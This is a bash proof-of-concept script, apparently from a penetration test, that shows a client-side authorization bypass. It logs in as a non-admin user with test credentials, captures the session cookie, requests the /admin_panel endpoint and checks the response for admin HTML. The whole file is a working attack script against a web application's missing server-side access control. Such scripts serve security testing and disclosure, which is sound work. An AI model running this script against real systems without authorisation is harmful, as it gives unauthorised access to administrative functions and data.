#!/bin/bash

# POC: Client-Side Authorization Bypass - Admin Panel Access Without Permissions
# This script demonstrates that the /admin_panel endpoint can be accessed by non-admin users
# The authorization is only enforced client-side via JavaScript, not server-side

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "Client-Side Authorization Bypass POC"
echo "=========================================="
echo ""

# Step 1: Login as regular (non-admin) user with redirect following
echo "[*] Step 1: Logging in as non-admin user..."
echo ""

TEMP_COOKIES=$(mktemp)
trap "rm -f $TEMP_COOKIES" EXIT

# Login with redirect following
curl -s -L -c "$TEMP_COOKIES" -b "$TEMP_COOKIES" \
  -X POST "${BASE_URL}/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" > /dev/null 2>&1

# Extract session cookie from the cookie jar
SESSION_COOKIE=$(grep "session" "$TEMP_COOKIES" | awk '{print $NF}' | head -1)

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Failed to extract session cookie from login"
  cat "$TEMP_COOKIES"
  exit 1
fi

echo "[+] Obtained session cookie: ${SESSION_COOKIE:0:20}..."
echo ""

# Step 2: Attempt to access /admin_panel as non-admin user
echo "[*] Step 2: Accessing /admin_panel endpoint as non-admin user..."
echo ""

# Get HTTP response code
HTTP_CODE=$(curl -s -o /tmp/admin_response.html -w "%{http_code}" \
  -H "Cookie: session=${SESSION_COOKIE}" \
  "${BASE_URL}/admin_panel")

echo "[+] HTTP Response Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" != "200" ]; then
  echo "[-] Expected HTTP 200, got $HTTP_CODE"
  echo "This might indicate server-side authorization is working"
  exit 1
fi

# Step 3: Check if we received the admin panel HTML
echo "[*] Step 3: Analyzing response content..."
echo ""

RESPONSE=$(cat /tmp/admin_response.html)

# Check for content length - if we got substantial content, it's likely the admin panel
CONTENT_LENGTH=${#RESPONSE}
echo "[*] Response content length: $CONTENT_LENGTH bytes"
echo ""

# Check for HTML content (not error page)
if echo "$RESPONSE" | grep -q "<html\|<body\|<head"; then
  echo "[+] VULNERABLE: Full HTML page served to non-admin user"
  VULN=1
else
  echo "[-] Response does not contain standard HTML"
  VULN=0
fi

# Check for admin-related keywords
if echo "$RESPONSE" | grep -qi "admin\|panel\|dashboard\|manage"; then
  echo "[+] Response contains admin/panel keywords"
fi

# Check for JavaScript-only error protection
if echo "$RESPONSE" | grep -qi "javascript\|modal\|error\|admin"; then
  echo "[+] Response appears to contain admin content"
fi

echo ""

# Step 4: Show specific evidence
echo "[*] Step 4: Showing response evidence..."
echo ""

if [ "$VULN" -eq 1 ]; then
  echo "[!] VULNERABILITY CONFIRMED: Non-admin user received admin panel HTML"
  echo ""
  echo "Evidence Summary:"
  echo "- HTTP Status Code: $HTTP_CODE (allows access)"
  echo "- HTML Content Served: YES (should return 403)"
  echo "- Content Length: $CONTENT_LENGTH bytes"
  echo "- Server-side authorization: MISSING"
  echo ""
  
  # Show first 40 lines of response
  echo "Response Preview (first 40 lines):"
  echo "===================================="
  head -40 /tmp/admin_response.html
  echo ""
  echo "===================================="
  echo ""
  
  # Check for specific admin indicators
  if grep -q "admin" /tmp/admin_response.html; then
    echo "[+] Confirmed: Response contains 'admin' keyword in HTML"
  fi
  
  exit 0
else
  echo "[-] Could not confirm vulnerability from response"
  echo "Response:"
  head -30 /tmp/admin_response.html
  exit 1
fi